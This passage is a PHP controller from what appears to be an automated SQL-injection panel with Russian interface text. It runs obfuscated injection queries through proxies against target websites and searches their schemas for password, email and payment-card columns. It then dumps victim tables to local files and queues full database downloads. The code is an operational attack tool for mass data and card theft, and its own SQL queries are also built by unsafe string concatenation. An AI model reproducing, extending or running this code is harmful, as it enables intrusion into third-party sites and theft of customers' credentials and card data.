		$pass = $this->passwords;
		$field = $this->Post->query('SELECT * FROM  `fileds_one` WHERE  `post_id` =' . $id);
		$squle = $this->Filed->query('SELECT * FROM  `posts_one` WHERE `id` = ' . $id);
		$this->mysqlInj = new $this->Injector();

		if (preg_match('/microsoft/i', $squle[0]['posts_one']['version'])) {
			$this->mysqlInj->mssql = true;
			$this->d('MSSQL!');
		}


		$this->proxyCheck();

		if (2 < strlen($squle[0]['posts_one']['sleep'])) {
			$set = $squle[0]['posts_one']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle['post_one']['header'] . '::' . $squle[0]['posts_one']['gurl'], $squle[0], $set);

		foreach ($field as $pole ) {
			$bd = explode(':', $pole['fileds_one']['ipbase']);
			$this->d($bd, '$bd');
			$password = ':';

			foreach ($pass as $pps ) {
				$this->workup();

				if ($this->mysqlInj->mssql == true) {
					$bd_new = $bd[1];
					$pps = $this->mysqlInj->charcher_mssql('%' . $pps . '%');
					$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
					$mysql = $this->mysqlInj->mssqlGetValue('(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)');
					$mysql['COLUMN_NAME'] = $mysql['(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)'];
				}
				 else {
					$mysql = $this->mysqlInj->mysqlGetValue('information_schema', 'COLUMNS', 'COLUMN_NAME', 0, array(), ' WHERE `TABLE_NAME`=char(' . $this->charcher($bd[2]) . ') AND `TABLE_SCHEMA`=char(' . $this->charcher($bd[1]) . ') AND `COLUMN_NAME` LIKE char(' . $this->charcher('%' . $pps . '%') . ')');
				}

				$this->d($mysql, '$mysql');

				if (isset($mysql['COLUMN_NAME'])) {
					$password .= '' . $mysql['COLUMN_NAME'] . ':';
					continue;
				}

			}

			$this->d($password);
			$this->Filed->query('UPDATE  `fileds_one` SET  `password` =  "' . $password . '" WHERE  `id` =' . $pole['fileds_one']['id']);
		}
	}

	public function getFieldMails_one($bd, $table)
	{
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$data2 = $this->mysqlInj->mysqlGetFieldByTable($bd, $table);
		$data['bds'] = $bd;
		$data['field'][$bd][$table] = $data2;
		$data['table'] = $table;
		$this->Session->write('inject', $data);
		$this->set('data', $data);
		$this->render('dataonemails');
	}

	public function getFieldOrder_one($bd, $table)
	{
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$data2 = $this->mysqlInj->mysqlGetFieldByTable($bd, $table);
		$data['bds'] = $bd;
		$data['field'][$bd][$table] = $data2;
		$data['table'] = $table;
		$this->Session->write('inject', $data);
		$this->set('data', $data);
		$this->render('dataoneorder');
	}

	public function search_restart_pass($idf)
	{
		$pass = $this->passwords;
		flush();
		$field = $this->Post->query('SELECT * FROM  `fileds` WHERE  `id` =' . $idf);
		$this->d($field, '$field');
		$squle = $this->Filed->query('SELECT * FROM  `posts` WHERE `id` = ' . $field[0]['fileds']['post_id']);
		$this->mysqlInj = new $this->Injector();

		if (preg_match('/microsoft/i', $squle[0]['posts']['version'])) {
			$this->mysqlInj->mssql = true;
			$this->d('MSSQL!');
		}


		$this->proxyCheck();

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$bd = explode(':', $field[0]['fileds']['ipbase']);
		$this->d($bd, '$bd');
		$password = ':';

		foreach ($pass as $pps ) {
			$this->workup();

			if ($this->mysqlInj->mssql == true) {
				$bd_new = $bd[1];
				$pps = $this->mysqlInj->charcher_mssql('%' . $pps . '%');
				$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
				$mysql = $this->mysqlInj->mssqlGetValue('(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)');
				$mysql['COLUMN_NAME'] = $mysql['(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)'];
			}
			 else {
				$mysql = $this->mysqlInj->mysqlGetValue('information_schema', 'COLUMNS', 'COLUMN_NAME', 0, array(), ' WHERE `TABLE_NAME`=char(' . $this->charcher($bd[2]) . ') AND `TABLE_SCHEMA`=char(' . $this->charcher($bd[1]) . ') AND `COLUMN_NAME` LIKE char(' . $this->charcher('%' . $pps . '%') . ')');
			}

			$this->d($mysql, '$mysql');

			if (isset($mysql['COLUMN_NAME'])) {
				$password .= '' . $mysql['COLUMN_NAME'] . ':';
				echo 'GOOD:' . $password;
				continue;
			}

		}

		$this->d($password);
		$this->Filed->query('UPDATE  `fileds` SET  `password` =  "' . $password . '" WHERE  `id` =' . $idf);
	}

	public function search_restart_mail($id)
	{
		flush();
		$this->Post->query('UPDATE  `posts` SET  `getmail` =  0 WHERE  `posts`.`id` =' . $id);
		echo 'еще разочек будем мыла искать';
	}

	public function FindOrder_one($id)
	{
		ignore_user_abort(true);
		set_time_limit(0);
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		$cards = $this->cards;
		unset($data['orders']);
		$fieldcount = $this->Post->query('SELECT * FROM  `orders_one` WHERE  `post_id` =' . $squle['Post']['id']);

		if (0 < count($fieldcount)) {
			$post_id = $data['posts_one']['id'];
			echo '<a href=\'/posts/shlak_card_one/' . $post_id . '\'>Удалить найденные карты из кэша</a><br>';

			foreach ($fieldcount as $fff ) {
				$data['orders'][] = $fff['orders_one']['card2'];
				$count_table2 = '<span style=\'color:red; font-size:13px;font-weight:700;\'>' . $fff['orders_one']['count'] . '</span>';
				$card_one2 = $fff['orders_one']['bd'] . '/' . $fff['orders_one']['table'] . '(' . $count_table2 . ')/' . $fff['orders_one']['column'];
				$str = '<a target=\'_blank\' href=\'/posts/getFieldOrder_one/' . $fff['orders_one']['bd'] . '/' . $fff['orders_one']['table'] . '\'  style=\'color:red\'>Раскрыть</a>';
				echo $card_one2 . ' - ' . $str . '<br>';
			}

			$this->Session->write('inject', $data);
			$this->set('data', $data);
			$this->render('orderone');
			exit();
		}


		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$post_id = $squle['Post']['id'];
		$url2 = $squle['Post']['url'];
		$domen = $squle['Post']['domen'];
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$card = '';
		$i = 1;
		$this->d($pass);
		$this->tableOrder = '';
		$post_id = $data['posts_one']['id'];
		echo '<a href=\'/posts/shlak_card_one/' . $post_id . '\'>Удалить найденные карты из кэша</a><br>';

		foreach ($cards as $pps ) {
			$pss = trim($pps);
			$this->workup();
			$mysql_all = $this->mysqlInj->mysqlGetAllValue('information_schema', 'COLUMNS', array('COLUMN_NAME', 'TABLE_NAME', 'TABLE_SCHEMA'), 0, array(), 'WHERE `COLUMN_NAME` LIKE char(' . $this->charcher('%' . $pps . '%') . ') AND ( DATA_TYPE=char(' . $this->charcher('char') . ') OR DATA_TYPE=char(' . $this->charcher('varchar') . ') OR DATA_TYPE=char(' . $this->charcher('text') . '))');

			if (isset($mysql_all) && (0 < count($mysql_all))) {
				foreach ($mysql_all as $mysql ) {
					if (isset($mysql['COLUMN_NAME']) && ($mysql['COLUMN_NAME'] != NULL) && ($mysql['COLUMN_NAME'] != 'null')) {
						if (in_array($mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'], $this->card_dubles)) {
							continue;
						}


						$this->card_dubles[] = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
						$bd = $mysql['TABLE_SCHEMA'];
						$table = $mysql['TABLE_NAME'];
						$column = $mysql['COLUMN_NAME'];
						$this->tableOrder = $table;
						$card .= ' ' . $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
						$card_one = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
						$count_table = $this->mysqlInj->mysqlGetCountInsert($bd, $table);

						if (20 < $count_table) {
							$count_table2 = '<span style=\'color:red; font-size:13px;font-weight:700;\'>' . $count_table . '</span>';
							$card_one2 = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '(' . $count_table2 . ')/' . $mysql['COLUMN_NAME'];
							$card_one_count = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '(' . $count_table . ')/' . $mysql['COLUMN_NAME'];
							echo $card_one2 . '<br>';
							$data['orders'][] = $card_one2;
							$uniq = $this->Post->query('SELECT * FROM `orders_one` WHERE `bd`=\'' . $bd . '\' AND `table`=\'' . $table . '\' AND `column`=\'' . $column . '\' limit 1');
							$count = count($uniq);

							if ($count == 0) {
								if ($this->Post->query('INSERT INTO orders_one (' . "\r\n\t\t\t\t\t\t\t\t" . '`post_id`,' . "\r\n\t\t\t\t\t\t\t\t" . '`bd`,' . "\r\n\t\t\t\t\t\t\t\t" . '`table`,' . "\r\n\t\t\t\t\t\t\t\t" . '`column`,' . "\r\n\t\t\t\t\t\t\t\t" . '`count`,' . "\r\n\t\t\t\t\t\t\t\t" . '`card2`,' . "\r\n\t\t\t\t\t\t\t\t" . '`domen`) ' . "\r\n\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t" . 'VALUES(' . "\r\n\t\t\t\t\t\t\t\t" . $post_id . ',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $bd . '\',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $table . '\',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $column . '\',' . "\r\n\t\t\t\t\t\t\t\t" . $count_table . ',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $card_one_count . '\',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $domen . '\')')) {
								}

							}

						}

					}

				}
			}

		}

		$this->Session->write('inject', $data);
		$this->set('data', $data);
		$this->render('orderone');
		exit();
	}

	public function FindOrderTable_one($id)
	{
		ignore_user_abort(true);
		set_time_limit(0);
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		$cards = $this->cards;
		unset($data['ordersTable']);
		$fieldcount = $this->Post->query('SELECT * FROM  `ordersTable_one` WHERE  `post_id` =' . $squle['Post']['id']);

		if (0 < count($fieldcount)) {
			$post_id = $data['posts_one']['id'];
			echo '<a href=\'/posts/shlak_cardTable_one/' . $post_id . '\'>Удалить найденные карты(таблицы) из кэша</a><br>';

			foreach ($fieldcount as $fff ) {
				$data['ordersTable'][] = $fff['ordersTable_one']['card2'];
				$count_table2 = '<span style=\'color:red; font-size:13px;font-weight:700;\'>' . $fff['ordersTable_one']['count'] . '</span>';
				$card_one2 = $fff['ordersTable_one']['bd'] . '/' . $fff['ordersTable_one']['table'] . '(' . $count_table2 . ')';
				echo $card_one2 . '<br>';
			}

			$this->Session->write('inject', $data);
			exit();
		}


		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$post_id = $squle['Post']['id'];
		$url2 = $squle['Post']['url'];
		$domen = $squle['Post']['domen'];
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$card = '';
		$i = 1;
		$this->d($pass);
		$this->tableOrder = '';
		$post_id = $data['posts_one']['id'];
		echo '<a href=\'/posts/shlak_cardTable_one/' . $post_id . '\'>Удалить найденные карты из кэша</a><br>';

		foreach ($cards as $pps ) {
			$pss = trim($pps);
			$this->workup();
			$mysql_all = $this->mysqlInj->mysqlGetAllValue('information_schema', 'TABLES', array('TABLE_NAME', 'TABLE_SCHEMA'), 0, array(), 'WHERE `TABLE_NAME` LIKE char(' . $this->charcher('%' . $pps . '%') . ')');

			if (isset($mysql_all) && (0 < count($mysql_all))) {
				foreach ($mysql_all as $mysql ) {
					if (isset($mysql['TABLE_NAME']) && ($mysql['TABLE_NAME'] != NULL) && ($mysql['TABLE_NAME'] != 'null')) {
						if (in_array($mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'], $this->card_dubles)) {
							continue;
						}


						$this->card_dubles[] = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'];
						$bd = $mysql['TABLE_SCHEMA'];
						$table = $mysql['TABLE_NAME'];
						$this->tableOrder = $table;
						$card .= ' ' . $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'];
						$card_one = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'];
						$count_table = $this->mysqlInj->mysqlGetCountInsert($bd, $table);

						if (20 < $count_table) {
							$count_table2 = '<span style=\'color:red; font-size:13px;font-weight:700;\'>' . $count_table . '</span>';
							$card_one2 = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '(' . $count_table2 . ')/';
							$card_one_count = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '(' . $count_table . ')/';
							echo $card_one2 . '<br>';
							$data['orders'][] = $card_one2;
							$uniq = $this->Post->query('SELECT * FROM `ordersTable_one` WHERE `bd`=\'' . $bd . '\' AND `table`=\'' . $table . '\'  limit 1');
							$count = count($uniq);

							if ($count == 0) {
								if ($this->Post->query('INSERT INTO ordersTable_one (' . "\r\n\t\t\t\t\t\t\t\t" . '`post_id`,' . "\r\n\t\t\t\t\t\t\t\t" . '`bd`,' . "\r\n\t\t\t\t\t\t\t\t" . '`table`,' . "\r\n\t\t\t\t\t\t\t\t" . '`count`,' . "\r\n\t\t\t\t\t\t\t\t" . '`card2`,' . "\r\n\t\t\t\t\t\t\t\t" . '`domen`) ' . "\r\n\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t" . 'VALUES(' . "\r\n\t\t\t\t\t\t\t\t" . $post_id . ',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $bd . '\',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $table . '\',' . "\r\n\t\t\t\t\t\t\t\t" . $count_table . ',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $card_one_count . '\',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $domen . '\')')) {
								}

							}

						}

					}

				}
			}

		}

		$this->Session->write('inject', $data);
		$this->set('data', $data);
		$this->render('orderone');
		exit();
	}

	public function chengetable_one($bd, $table, $field)
	{
		$tablea = $this->Session->read('table');

		if (($bd . '.' . $table) !== $tablea) {
			$this->Session->write('table', $bd . '.' . $table);
			$this->Session->write('field', $field);
			$this->Session->write('getwhere', '');
			$this->Session->write('tablecount', '15');
		}
		 else {
			$fileds = $this->Session->read('field');

			if (!(isset($this->data[$field]))) {
				$fileds = str_replace(',' . $field, '', $fileds);
				$fileds = str_replace($field, '', $fileds);
			}
			 else {
				$fileds .= ',' . $field;
			}

			$fields = explode(',', $fileds);
			$i = 0;
			$new = '';

			foreach ($fields as $f ) {
				if (trim($f) !== '') {
					if ($i == 0) {
						$new = $f;
					}
					 else {
						$new = $new . ',' . $f;
					}

					++$i;
				}

			}

			$this->Session->write('field', $new);
		}

		$this->gettable_one();
		$this->layout = false;
		$this->render('gettableone');
	}

	public function chengetable_one_mails($bd, $table, $field)
	{
		$tablea = $this->Session->read('table');

		if (($bd . '.' . $table) !== $tablea) {
			$this->Session->write('table', $bd . '.' . $table);
			$this->Session->write('field', $field);
			$this->Session->write('getwhere', '');
			$this->Session->write('tablecount', '15');
		}
		 else {
			$fileds = $this->Session->read('field');

			if (!(isset($this->data[$field]))) {
				$fileds = str_replace(',' . $field, '', $fileds);
				$fileds = str_replace($field, '', $fileds);
			}
			 else {
				$fileds .= ',' . $field;
			}

			$fields = explode(',', $fileds);
			$i = 0;
			$new = '';

			foreach ($fields as $f ) {
				if (trim($f) !== '') {
					if ($i == 0) {
						$new = $f;
					}
					 else {
						$new = $new . ',' . $f;
					}

					++$i;
				}

			}

			$this->Session->write('field', $new);
		}

		$this->gettable_one();
		$this->layout = false;
		$this->render('gettableone_mails');
	}

	public function chengetable_one_orders($bd, $table, $field)
	{
		$tablea = $this->Session->read('table');

		if (($bd . '.' . $table) !== $tablea) {
			$this->Session->write('table', $bd . '.' . $table);
			$this->Session->write('field', $field);
			$this->Session->write('getwhere', '');
			$this->Session->write('tablecount', '15');
		}
		 else {
			$fileds = $this->Session->read('field');

			if (!(isset($this->data[$field]))) {
				$fileds = str_replace(',' . $field, '', $fileds);
				$fileds = str_replace($field, '', $fileds);
			}
			 else {
				$fileds .= ',' . $field;
			}

			$fields = explode(',', $fileds);
			$i = 0;
			$new = '';

			foreach ($fields as $f ) {
				if (trim($f) !== '') {
					if ($i == 0) {
						$new = $f;
					}
					 else {
						$new = $new . ',' . $f;
					}

					++$i;
				}

			}

			$this->d($new, '$new');
			$this->Session->write('field', $new);
		}

		$this->gettable_one();
		$this->layout = false;
		$this->render('gettableone_orders');
	}

	public function getcooldata_one_now()
	{
		$order = array();
		$get['limit'] = intval($this->Session->read('getlimit'));

		if (count($_POST) != 0) {
			$field = array();

			foreach ($_POST as $ll => $kk ) {
				if (preg_match('/check-/', $ll)) {
					$field[] = $kk;
				}

			}
		}


		$get['limit'] = $_POST['limit'];
		$this->d($_POST, 'post');
		$bd = $_POST['bd'];
		$table = $_POST['table'];
		$get['desc'] = $_POST['desc'];
		if (($get['limit'] == '') || empty($get['limit'])) {
			$get['limit'] = 10;
		}


		$t = explode('.', $this->Session->read('table'));
		$get['table'] = $table;
		$get['bd'] = $bd;
		$get['where'] = $this->Session->read('getwhere');
		$get['order'] = $this->Session->read('getorder');

		if ($get['desc'] == '') {
			$get['desc'] = 0;
		}


		$get['field'] = $field;
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];

		if (2 < strlen($squle['Post']['sleep'])) {
			$this->d($set, 'set');
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$data2['id'] = $squle['Post']['id'];
		$data2['bd'] = $get['bd'];
		$data2['table'] = $get['table'];
		$data2['field'] = $get['field'];
		$bd = $data2['bd'];
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if ($get['desc'] == 0) {
			$this->mysqlInj->desc = 0;
			$this->mysqlInj->desc_enable = true;
		}
		 else {
			$this->mysqlInj->desc = 1;
		}

		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$data3 = $this->mysqlInj->mysqlGetAllValue($get['bd'], $get['table'], $get['field'], $get['limit'], $order, $get['where']);
		$this->d($data3, '$data3');

		foreach ($data3 as $hh ) {
			$this->d($hh);
		}

		echo '<br>++++++++++++++++++++++++++++++++++++<br>';

		foreach ($data3 as $ss => $hh ) {
			$this->d(implode(',', $hh));
		}
	}

	public function getcooldata_one()
	{
		$order = array();
		$get['limit'] = intval($this->Session->read('getlimit'));
		if (($get['limit'] == '') || empty($get['limit'])) {
			$get['limit'] = 5;
		}


		$t = explode('.', $this->Session->read('table'));
		$get['table'] = $t[1];
		$get['bd'] = $t[0];
		$get['where'] = $this->Session->read('getwhere');
		$get['order'] = $this->Session->read('getorder');
		$get['desc'] = $this->Session->read('getdesc');
		if (($get['desc'] == '') || empty($get['desc'])) {
			$get['desc'] = 0;
		}


		$get['field'] = $this->Session->read('field');
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];

		if (2 < strlen($squle['Post']['sleep'])) {
			$this->d($set, 'set');
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if ($get['desc'] == 0) {
			$this->mysqlInj->desc = 0;
			$this->mysqlInj->desc_enable = true;
		}
		 else {
			$this->mysqlInj->desc = 1;
		}

		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$data3 = $this->mysqlInj->mysqlGetAllValue($get['bd'], $get['table'], explode(',', $get['field']), $get['limit'], $order, $get['where']);
		$count = $this->mysqlInj->mysqlGetCountInsert($get['bd'], $get['table']);
		$this->Session->write('counttable', $count);
		$data = array(
			'data' => array($squle['Post']['id'] => $data3)
			);
		$this->layout = false;
		$this->set('field', $this->Session->read('field'));
		$this->set('counttable', $count);
		$this->set('dataCOLL', $data);
		$this->set('inject', $data);
		$this->render('viewdataone');
	}

	public function getcooldata_one_dump()
	{
		$order = array();
		$get['limit'] = intval($this->Session->read('getlimit'));
		if (($get['limit'] == '') || empty($get['limit'])) {
			$get['limit'] = 5;
		}


		$t = explode('.', $this->Session->read('table'));
		$get['table'] = $t[1];
		$get['bd'] = $t[0];
		$get['where'] = $this->Session->read('getwhere');
		$get['order'] = $this->Session->read('getorder');
		$get['desc'] = $this->Session->read('getdesc');
		$get['field'] = $this->Session->read('field');
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];

		if (2 < strlen($squle['Post']['sleep'])) {
			$this->d($set, 'set');
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if ($get['desc'] == 0) {
			$this->mysqlInj->desc = 0;
			$this->mysqlInj->desc_enable = true;
		}
		 else {
			$this->mysqlInj->desc = 1;
		}

		$url = parse_url($squle['Post']['gurl']);
		$filename = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/slivdump_one/' . $url['host'] . '_' . $get['bd'] . '_' . $get['table'] . '.txt';
		$this->d($filename, '$filename');
		$fh = fopen($filename, 'a+');
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$count = $this->mysqlInj->mysqlGetCountInsert($get['bd'], $get['table']);
		$data3 = $this->mysqlInj->mysqlGetAllValue($get['bd'], $get['table'], explode(',', $get['field']), $count, $order, $get['where']);
		fwrite($fh, trim($squle['Post']['gurl']) . "\n");

		foreach ($data3 as $fff ) {
			$col_str = implode(';', $fff);
			fwrite($fh, trim($col_str) . "\n");
		}

		$this->layout = false;
	}

	public function gettable_one()
	{
		$this->layout = false;
		$fileds = $this->Session->read('field');
		$this->set('field', $fileds);
	}

	public function choisgetdata_one($param)
	{
		$val = $_POST;

		if (isset($_POST['data'])) {
			$val = $_POST['data'];
		}


		$this->Session->write('get' . $param, $val[$param]);
		exit();
	}

	public function getdump_one()
	{
		$order = array();
		$get['limit'] = intval($this->Session->read('getlimit'));
		if (($get['limit'] == '') || empty($get['limit'])) {
			$get['limit'] = 5;
		}


		$t = explode('.', $this->Session->read('table'));
		$get['table'] = $t[1];
		$get['bd'] = $t[0];
		$get['where'] = $this->Session->read('getwhere');
		$get['order'] = $this->Session->read('getorder');
		$get['desc'] = $this->Session->read('getdesc');
		if (($get['desc'] == '') || empty($get['desc'])) {
			$get['desc'] = 0;
		}


		$get['field'] = $this->Session->read('field');
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];

		if (2 < strlen($squle['Post']['sleep'])) {
			$this->d($set, 'set');
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$data2['id'] = $squle['Post']['id'];
		$data2['bd'] = $get['bd'];
		$data2['table'] = $get['table'];
		$data2['field'] = $get['field'];
		$bd = $data2['bd'];
		$bd = $bd . ':' . $data2['table'];
		$squle2 = $this->Post->query('SELECT * FROM  `fileds_one` WHERE `table`=\'' . $data2['table'] . '\' AND `post_id` =\'' . $squle['Post']['id'] . '\' AND `ipbase`  like (\'%' . $bd . '%\') limit 0,1');
		$this->d($bd, '$bd');

		if ($this->Post->query('UPDATE  `fileds_one` SET  `get` =  \'1\',`pri`=1,`multi` = 1,`potok`=0,`filed`=\'' . $data2['field'] . '\' WHERE  `table` =\'' . $data2['table'] . '\' AND `post_id` =\'' . $squle['Post']['id'] . '\' AND `ipbase` like (\'%' . $bd . '%\')')) {
			$this->Post->query('DELETE FROM `multis_one` WHERE `filed_id`=' . $squle2[0]['fileds_one']['id']);
			echo 'Мы вас поняли. скачивание БД начнемся в фоном режиме, если уже качали то перекачаем по новой !!!';
		}
		 else {
			echo 'Что то не ставится';
			$this->d('UPDATE  `fileds_one` SET  `get` =  \'1\',`multi` = 1,`pri`=1, `filed`=\'' . $data2['field'] . '\' WHERE  `table` =\'' . $data2['table'] . '\' AND `post_id` =\'' . $squle['Post']['id'] . '\' AND `ipbase` like (\'' . $bd . '%\')');
		}

		exit();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if ($get['desc'] == 0) {
			$this->mysqlInj->desc = 0;
			$this->mysqlInj->desc_enable = true;
		}
		 else {
			$this->mysqlInj->desc = 1;
		}

		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$this->Session->write('counttable', $count);
		$data = array(
			'data' => array($squle['Post']['id'] => $data3)
			);
		$this->layout = false;
		$this->set('field', $this->Session->read('field'));
		$this->set('dataCOLL', $data);
		$this->set('inject', $data);
		$this->render('viewdataone');
	}

	public function viewdataone()
	{
		$order = array();
		$get['limit'] = intval($this->Session->read('getlimit'));
		if (($get['limit'] == '') || empty($get['limit'])) {
			$get['limit'] = 5;
		}


		$t = explode('.', $this->Session->read('table'));
		$get['table'] = $t[1];
		$get['bd'] = $t[0];
		$get['where'] = $this->Session->read('getwhere');
		$get['order'] = $this->Session->read('getorder');
		$get['desc'] = $this->Session->read('getdesc');
		if (($get['desc'] == '') || empty($get['desc'])) {
			$get['desc'] = 0;
		}


		$get['field'] = $this->Session->read('field');
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];

		if (2 < strlen($squle['Post']['sleep'])) {
			$this->d($set, 'set');
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if ($get['desc'] == 0) {
			$this->mysqlInj->desc = 0;
			$this->mysqlInj->desc_enable = true;
		}
		 else {
			$this->mysqlInj->desc = 1;
		}

		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$data3 = $this->mysqlInj->mysqlGetAllValue($get['bd'], $get['table'], explode(',', $get['field']), $get['limit'], $order, $get['where']);
		$count = $this->mysqlInj->mysqlGetCountInsert($get['bd'], $get['table']);
		$this->Session->write('counttable', $count);
		$data = array(
			'data' => array($squle['Post']['id'] => $data3)
			);
		$this->layout = false;
		$this->set('field', $this->Session->read('field'));
		$this->set('counttable', $count);
		$this->set('dataCOLL', $data);
		$this->set('inject', $data);
		$this->render('viewdataone');
	}

	public function viewdata_one()
	{
		$data = array(
			'data' => array(
				2 => array(
					array('id' => '11', 'date' => 'РґР¶РёРіСѓСЂРґР°!1')
					)
				)
			);
		$this->layout = false;
		$this->set('count', $this->Session->read('field'));
		$this->set('field', $this->Session->read('field'));
		$this->set('dataCOLL', $data);
	}

	public function shlak_one($id)
	{
		$this->Post->query('DELETE FROM `posts_one` WHERE `id`=' . $id);
		exit();
		$this->redirect(array('action' => 'krutaten_one/' . $id));
	}

	public function shlak_all($id)
	{
		$this->Post->query('DELETE FROM `posts_all` WHERE `id`=' . $id);
		exit();
		$this->redirect(array('action' => 'krutaten_one/' . $id));
	}

	public function shlak_filed($id)
	{
		$this->Post->query('DELETE FROM `fileds_one` WHERE `post_id`=' . $id);
		$data = $this->Session->read('inject');
		$this->d($data);
		unset($data['emails']);
		$this->d($data, 'data');
		$this->Session->write('inject', $data);
		$this->redirect(array('action' => 'krutaten_one/' . $id));
	}

	public function shlak_card_one($id)
	{
		$this->Post->query('DELETE FROM `orders_one` WHERE `post_id`=' . $id);
		$data = $this->Session->read('inject');
		unset($data['orders']);
		$this->Session->write('inject', $data);
		$this->redirect(array('action' => 'krutaten_one/' . $id));
	}

	public function shlak_domen($id)
	{
		$this->Post->query('DELETE FROM `domens` WHERE `id`=' . $id);
		$data = $this->Session->read('inject');
		unset($data['orders']);
		$this->Session->write('inject', $data);
		$this->redirect(array('action' => 'order_domens/' . $id));
	}

	public function shlak_domen_bad($id)
	{
		$this->Post->query('DELETE FROM `domens` WHERE `id`=' . $id);
		$data = $this->Session->read('inject');
		unset($data['orders']);
		$this->Session->write('inject', $data);
		$this->redirect(array('action' => 'order_domens_bad/' . $id));
	}

	public function shlak_cardTable_one($id)
	{
		$this->Post->query('DELETE FROM `ordersTable_one` WHERE `post_id`=' . $id);
